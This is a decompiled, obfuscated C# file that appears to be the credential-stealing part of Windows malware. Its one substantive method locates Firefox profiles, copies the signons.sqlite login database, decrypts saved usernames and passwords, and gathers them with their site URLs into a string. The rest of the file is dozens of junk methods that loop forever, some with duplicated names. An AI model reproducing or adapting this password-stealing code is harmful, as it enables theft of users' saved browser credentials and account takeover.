using System;
using System.Collections;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using gdzju;
using vwGeL;
using zwIZa;

namespace WiWUO;

public class eULZj
{
	public static string wBDuU;

	public static ArrayList wbMHv = new ArrayList();

	public static string GetMozillaFirefox()
	{
		string result = default(string);
		try
		{
			byte[] database = new byte[0];
			string sourceFileName = "";
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Mozilla Firefox\\");
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles");
			if (Directory.Exists(text))
			{
				if (Directory.Exists(path))
				{
					string[] directories = Directory.GetDirectories(path);
					foreach (string text2 in directories)
					{
						string[] files = Directory.GetFiles(text2);
						foreach (string text3 in files)
						{
							if (text3.EndsWith("signons.sqlite") && eMBVL.AuthenticateSql(text, text2))
							{
								sourceFileName = text3;
								break;
							}
						}
					}
				}
				string tempFileName = Path.GetTempFileName();
				File.Copy(sourceFileName, tempFileName, overwrite: true);
				if (string.IsNullOrEmpty(tempFileName))
				{
					result = "No saved data was found!";
					return result;
				}
				bool flag = false;
				do
				{
					try
					{
						database = File.ReadAllBytes(tempFileName);
						flag = true;
					}
					catch (IOException projectError)
					{
						ProjectData.SetProjectError((Exception)projectError);
						Thread.Sleep(3000);
						ProjectData.ClearProjectError();
					}
				}
				while (!flag);
				pJRGl pJRGl = new pJRGl(database);
				if (pJRGl.CompareRows("moz_logins"))
				{
					ZNKEW[] array = new ZNKEW[pJRGl.GetLength() - 1 + 1];
					for (int k = 0; k <= pJRGl.GetLength(); k++)
					{
						string text4 = pJRGl.CheckIfContains(k, "formSubmitURL");
						if (string.IsNullOrEmpty(text4))
						{
							continue;
						}
						array[k] = new ZNKEW();
						wbMHv.Add("Host: " + text4);
						string str = pJRGl.CheckIfContains(k, "encryptedUsername");
						string pointerAsString = eMBVL.GetPointerAsString(str);
						if (!string.IsNullOrEmpty(pointerAsString))
						{
							wbMHv.Add("Username: " + pointerAsString);
							string str2 = pJRGl.CheckIfContains(k, "encryptedPassword");
							string pointerAsString2 = eMBVL.GetPointerAsString(str2);
							if (!string.IsNullOrEmpty(pointerAsString2))
							{
								wbMHv.Add("Password: " + pointerAsString2 + "\r\n");
							}
						}
					}
					eMBVL.GetSlot();
				}
			}
			try
			{
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = wbMHv.GetEnumerator();
					while (enumerator.MoveNext())
					{
						string text5 = Conversions.ToString(enumerator.Current);
						wBDuU = wBDuU + text5.ToString() + "\r\n";
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				if (Operators.CompareString(wBDuU, string.Empty, false) == 0)
				{
					result = "No saved data was found!";
					return result;
				}
				result = wBDuU + Environment.NewLine;
				return result;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				result = "No saved data was found!";
				ProjectData.ClearProjectError();
				return result;
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static void SSFrT()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void qwsFI()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void fejUN()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void XbpzV()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void spNiH()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void RHmvv()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void GoqLn()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void MlwrJ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void TzHZh()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void rRtZX()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void hMkCO()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void mKqUk()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void uKORJ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void FrTpC()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void qwsFI()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Wffej()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void pYauX()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void RVvVg()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void GdYCD()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Pcbru()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void lyYYz()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void PyKQM()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void hXDxy()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void tZXFt()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void hMkCO()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void bdmKq()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wEiJu()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ZjSSF()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void cZwSq()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void nHBqW()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ZxNGp()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void EgOfR()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void YmIvG()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void zWdkP()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void nsGDl()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wrJsP()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void TzHZh()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void xBrRt()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void QYlNh()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void cnFGb()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void POSEw()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void KeULZ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void eTQKc()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void IkBTn()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void LbehZ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void VIjGE()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void HzvHY()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void mvvuz()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void GoqLn()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ewWwI()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void gEyce()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void cDCSI()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void MMzza()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void qakqm()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void JyeZa()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void VzkfU()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void IZLPp()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void DENXS()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void XeJWV()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void zLfsg()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void EBXtS()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void OUcRw()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void zZogR()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void fIbGe()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void yOVXg()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void NxFMc()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void PGTdM()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void KEWUq()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ubhBJ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void YbTrV()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void dzMaI()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void EPShD()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void qoteX()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void kFhmz()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void GgrlE()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void iMOuO()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void lCGIz()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ijKTf()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void UaWiy()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void OJJIN()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}
}
